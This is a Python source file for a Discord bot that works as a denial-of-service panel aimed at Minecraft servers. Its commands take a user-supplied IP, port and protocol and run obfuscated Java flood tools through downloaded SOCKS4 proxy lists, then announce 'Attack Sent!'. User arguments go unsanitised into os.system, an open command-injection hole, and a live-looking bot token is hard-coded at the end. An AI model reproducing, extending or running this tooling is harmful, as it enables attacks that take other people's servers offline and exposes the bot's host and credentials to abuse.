import discord
from discord.ext import commands
import os
import asyncio
import requests
import urllib.request
import json

intents = discord.Intents.all()
client = commands.Bot(command_prefix='.', intents=intents)
client.remove_command('help')  # Now 'client' is defined before using it

def run_blocking_function(func, *args):
    loop = asyncio.get_event_loop()
    return loop.run_in_executor(None, func, *args)


def create_embed(title, description, ip, port, method, protocol):
    embed = discord.Embed(
        title=title,
        description=description,
        color=discord.Colour.orange()
    )

    embed.add_field(name='ip:', value=ip, inline=False)
    embed.add_field(name='port:', value=port, inline=False)
    embed.add_field(name='method:', value=method, inline=False)
    embed.add_field(name='protocol:', value=protocol, inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/855793810118017044/863740346713899038/startup-icon-vector-id1074164928.png')
    embed.set_image(url=f'http://status.mclive.eu/McRange/{ip}/{port}/banner.png')
    embed.timestamp = discord.utils.utcnow()
    return embed


@client.event
async def on_ready():
    print("Bot No Embed Loaded!")


@client.command()
async def proxy(ctx):
    os.system('rm socks4.txt')
    os.system('wget https://api.openproxylist.xyz/socks4.txt')
    await ctx.send("Proxy list updated successfully!")


@client.command()
async def handshake(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"screen -d -m java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 0 35 {arg3} 160 socks4.txt socks4")

    embed = create_embed('Attack Sent!', 'Attack sent successfully!', arg1, arg2, 'handshake', arg3)
    await ctx.send(embed=embed)
    await run_blocking_function(attack)


@client.command()
@commands.has_permissions(manage_messages=True)
async def stop(ctx):
    os.system("pkill 'java'")
    embed = discord.Embed(
        title='Attacks Stopped!',
        description=f'All Attack stopped successfully!',
        color=discord.Colour.orange()
    )

    await ctx.send(embed=embed)


@client.command()
async def join(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"screen -d -m java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 2 35 {arg3} 160 socks4.txt socks4")

    embed = create_embed('Attack Sent!', 'Attack sent successfully!', arg1, arg2, 'join', arg3)
    await ctx.send(embed=embed)
    await run_blocking_function(attack)


@client.command()
async def randombytes(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"screen -d -m java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 3 35 {arg3} 160 socks4.txt socks4")

    embed = create_embed('Attack Sent!', 'Attack sent successfully!', arg1, arg2, 'randombytes', arg3)
    await ctx.send(embed=embed)
    await run_blocking_function(attack)


@client.command()
async def motd(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"screen -d -m java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 1 35 {arg3} 160 socks4.txt socks4")

    embed = create_embed('Attack Sent!', 'Attack sent successfully!', arg1, arg2, 'motd', arg3)
    await ctx.send(embed=embed)
    await run_blocking_function(attack)


@client.command()
async def flamecord(ctx, arg1, arg2):
    def attack():
        os.system(
            f"java -jar SynexHub_obf.jar host={arg1} port={arg2} threads=15000 file=socks4.txt method=bypass timeout=1000 loop=300")

    embed = create_embed('Attack Sent!', 'Attack sent successfully!', arg1, arg2, 'flamecord', '47')
    embed.set_footer(text="McSmash")
    await ctx.send(embed=embed)
    await run_blocking_function(attack)


@client.command()
async def join2(ctx, arg1, arg2):
    def attack():
        os.system(
            f"java -jar SynexHub_obf.jar host={arg1} port={arg2} threads=15000 file=socks4.txt method=join timeout=1000 loop=300")

    embed = create_embed('Attack Sent!', 'Attack sent successfully!', arg1, arg2, 'bots join 2!', '47')
    embed.set_footer(text="McSmash")
    await ctx.send(embed=embed)
    await run_blocking_function(attack)


@client.command()
async def abd(ctx, arg1, arg2):
    def attack():
        os.system(
            f"java -jar SynexHub_obf.jar host={arg1} port={arg2} threads=15000 file=socks4.txt method=antibotdeluxe timeout=1000 loop=300")

    embed = create_embed('Attack Sent!', 'Attack sent successfully!', arg1, arg2, 'bots join op 3!', '47')
    embed.set_footer(text="McSmash")
    await ctx.send(embed=embed)
    await run_blocking_function(attack)


@client.command()
async def longstring(ctx, arg1, arg2, arg3):
    def attack():
        os.system(
            f"screen -d -m java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 4 35 {arg3} 160 socks4.txt socks4")

    embed = create_embed('Attack Sent!', 'Attack sent successfully!', arg1, arg2, 'longstring', arg3)
    await ctx.send(embed=embed)
    await run_blocking_function(attack)


@client.command()
async def help(ctx):
    embed = discord.Embed(
        color=discord.Colour.red()
    )
    embed.add_field(name='Join', value='>join ip port protocol')
    embed.add_field(name='RandomBytes', value='>randombytes ip port protocol', inline=False)
    embed.add_field(name='LongString', value='>longstring ip port protocol', inline=False)
    embed.add_field(name='Motd', value='>motd ip port protocol', inline=False)
    embed.add_field(name='Handshake', value='>handshake ip port protocol', inline=False)
    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/855793810118017044/863740346713899038/startup-icon-vector-id1074164928.png')
    await ctx.send(embed=embed)


@client.command()
async def resolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="resolved!",
        color=discord.Colour.red()
    )

    embed.add_field(name='Ip:', value=json_object["ip"], inline=False)
    embed.add_field(name='Port:', value=json_object["port"], inline=False)
    embed.add_field(name="Hostname:", value=json_object["hostname"], inline=False)
    embed.add_field(name="server online:", value=json_object["online"], inline=False)

    g = json_object["ip"]
    gb = json_object["port"]

    embed.set_thumbnail(
        url='https://cdn.discordapp.com/attachments/855793810118017044/863740346713899038/startup-icon-vector-id1074164928.png')
    embed.set_image(url=f'http://status.mclive.eu/McRange/{g}/{gb}/banner.png')
    await ctx.send(embed=embed)


@client.command()
async def aegis(ctx, arg1, arg2):
    def attack():
        os.system(
            f"screen -d -m java -jar SynexHub_obf.jar host={arg1} port={arg2} threads=10000 file=socks4.txt method=aegis timeout=1000 loop=300")
        os.system(f"")

    embed = create_embed('Attack Sent!', 'Attack sent successfully!', arg1, arg2, 'aegis', 'N/A')
    await ctx.send(embed=embed)
    await run_blocking_function(attack)

client.run('MTE5MDY2MTAwMjgwMzU2NDYwNQ.GS8hHA._82jvPzJlz-_t9SLcqkFBQ4NuZunDWo_BCDLiY')
